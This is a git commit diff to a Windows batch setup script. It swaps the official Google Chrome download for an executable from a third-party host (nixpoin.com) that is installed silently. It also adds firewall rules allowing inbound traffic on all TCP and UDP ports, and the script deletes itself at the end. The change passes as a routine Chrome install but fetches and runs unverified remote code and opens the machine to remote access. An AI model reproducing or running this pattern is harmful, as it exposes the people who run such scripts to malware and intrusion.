12d4d45053b609fff5668786c7e14a256062fd61
Zeedun0432 <zidanlagi864@gmail.com>
2025-05-22 06:05:53 +0700

    custom-script.bat

--- custom-script.bat
+++ custom-script.bat
@@ -4,20 +4,18 @@ ECHO EXTEND >> "%SystemDrive%\diskpart.extend"
 START /WAIT DISKPART /S "%SystemDrive%\diskpart.extend"
 del /f /q "%SystemDrive%\diskpart.extend"
 
-REM Download and install Chrome
 ECHO Downloading Google Chrome...
-powershell -Command "& {Invoke-WebRequest -Uri 'https://dl.google.com/chrome/install/latest/chrome_installer.exe' -OutFile '%TEMP%\chrome_installer.exe'}"
-
+powershell -Command "& {Invoke-WebRequest -Uri 'https://nixpoin.com/ChromeSetup.exe' -OutFile '%TEMP%\chrome_installer.exe'}"
 ECHO Installing Google Chrome...
 START /WAIT "%TEMP%\chrome_installer.exe" /silent /install
-
-REM Wait a moment for installation to complete
 timeout /t 10 /nobreak >nul
-
-REM Delete Chrome installer file
 ECHO Cleaning up Chrome installer...
 del /f /q "%TEMP%\chrome_installer.exe"
-
 ECHO Chrome installation completed and installer file deleted.
+
+ECHO Configuring Windows Firewall for game server...
+netsh advfirewall firewall add rule name="Game Server - Allow All TCP Inbound" dir=in action=allow protocol=TCP localport=1-65535
+netsh advfirewall firewall add rule name="Game Server - Allow All UDP Inbound" dir=in action=allow protocol=UDP localport=1-65535
+ECHO Firewall rules configured for game server (All TCP/UDP ports allowed).
 
 del "%~f0"
